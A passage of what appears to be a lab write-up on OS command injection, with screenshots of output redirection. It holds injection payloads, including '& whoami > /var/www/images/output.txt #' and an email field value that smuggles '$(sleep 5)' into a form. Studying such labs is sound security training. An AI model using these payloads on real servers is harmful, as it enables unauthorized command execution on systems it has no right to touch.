Putting whatever command and then redirecting the output of `whoami` to the file in the accessible route:
![](imgs/os_command_injection_output_Redirected.png)

Then we visit the route:
![](imgs/os_command_injection_output_Redirected-1.png)

I like more this command injection, without using pipelines:
`& whoami > /var/www/images/output.txt #`
![](imgs/os_command_injection_output_Redirected-2.png)

Also, we can make the execution of our commands inside `$`:
`email=invalid%40example.com%3b+$(sleep+5)+%23`
![](imgs/os_command_injection_output_Redirected-3.png)